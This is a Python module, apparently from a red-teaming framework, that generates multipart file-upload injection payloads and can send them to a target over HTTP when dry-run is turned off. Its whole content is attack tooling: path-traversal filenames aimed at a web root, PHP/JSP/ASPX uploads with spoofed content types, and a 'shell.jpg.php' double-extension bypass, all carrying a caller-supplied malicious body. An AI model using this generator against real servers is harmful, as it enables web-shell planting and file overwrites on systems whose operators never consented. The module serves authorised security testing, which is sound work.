# -*- coding: utf-8 -*-
"""file_upload — 文件上传注入攻击向量生成器 (coverage 策略 file_upload_injection)。

真实实现：构造 multipart/form-data 文件上传注入 payload（路径遍历文件名、polyglot 内容、
content-type 欺骗），并在提供 HTTPTarget 时实投。dry-run 仅产出 payload（C9 诚实、R-NATIVE 原生优先）。

Black-box 假设（R-S1 不硬编码目标）：注入点由调用方提供。

Academic basis:
    - OWASP ASI09:2025 — Untrusted File Upload
    - CWE-434: Unrestricted Upload of File with Dangerous Type

Constitution compliance:
    - R-H3: 单一职责 — file upload injection only
    - R-S1: 不硬编码目标标识符
    - R-S4: 测试全部 mock（dry_run 无网络）
"""

from __future__ import annotations

import logging
from typing import Any

logger = logging.getLogger(__name__)


# 危险扩展名与对应 content-type，用于 polyglot / content-type 欺骗
_DANGEROUS_EXT: dict[str, str] = {
    "php": "application/x-php",
    "jsp": "application/x-jsp",
    "aspx": "application/x-aspx",
    "html": "text/html",
}


def _build_multipart(
    field_name: str,
    filename: str,
    content: str,
    content_type: str,
    boundary: str = "----pyritBoundary",
) -> str:
    """构造单文件 multipart/form-data 请求体。"""
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
    )
    return head + content + f"\r\n--{boundary}--\r\n"


def run_file_upload_injection(
    payload: str,
    *,
    field_name: str = "file",
    filename: str = "../../../../var/www/uploads/evil.php",
    content_type: str = "application/octet-stream",
    target: Any | None = None,
    dry_run: bool = True,
) -> dict[str, Any]:
    """文件上传注入攻击（coverage 策略 file_upload_injection）。

    生成路径遍历 / polyglot / content-type 欺骗的上传 payload；提供 PyRIT HTTPTarget 且
    dry_run=False 时实投，否则仅产出 payload（不触网）。

    Args:
        payload: 注入到上传文件体内的恶意内容
        field_name: 上传表单字段名
        filename: 用于路径遍历的恶意文件名
        content_type: 声明的 content-type
        target: 可选 PyRIT HTTPTarget，实投目标
        dry_run: True 时仅产出 payload（默认）

    Returns:
        {"seeds": [...], "execution_report": dict|None, "count": int}
    """
    variants: list[dict[str, Any]] = []

    # 1) 路径遍历文件名
    variants.append(
        {
            "name": "path_traversal_filename",
            "filename": filename,
            "content_type": content_type,
            "body": _build_multipart(field_name, filename, payload, content_type),
        }
    )

    # 2) polyglot / content-type 欺骗（危险扩展名 + web content-type）
    for ext, ct in _DANGEROUS_EXT.items():
        fname = f"benign.{ext}"
        variants.append(
            {
                "name": f"polyglot_{ext}",
                "filename": fname,
                "content_type": ct,
                "body": _build_multipart(field_name, fname, payload, ct),
            }
        )

    # 3) 双扩展名绕过
    variants.append(
        {
            "name": "double_extension",
            "filename": "shell.jpg.php",
            "content_type": "image/jpeg",
            "body": _build_multipart(field_name, "shell.jpg.php", payload, "image/jpeg"),
        }
    )

    produced: dict[str, Any] = {
        "seeds": [
            {
                "value": v["body"],
                "metadata": {
                    "category": "file_upload_injection",
                    "technique": v["name"],
                    "filename": v["filename"],
                    "severity": "high",
                },
            }
            for v in variants
        ],
        "execution_report": None,
        "count": len(variants),
    }

    if target is not None and not dry_run:
        try:
            report: list[dict[str, Any]] = []
            for v in variants:
                resp = target.send_prompt_async(prompt_text=v["body"]) if hasattr(target, "send_prompt_async") else None
                report.append({"technique": v["name"], "response": str(resp)[:300]})
            produced["execution_report"] = report
            logger.info("[Chain] file_upload_injection 实投 %d 个 payload", len(variants))
        except Exception as e:  # noqa: BLE001
            logger.warning("[Chain] file_upload_injection 实投失败（不影响 payload 产出）: %s", e)

    return produced
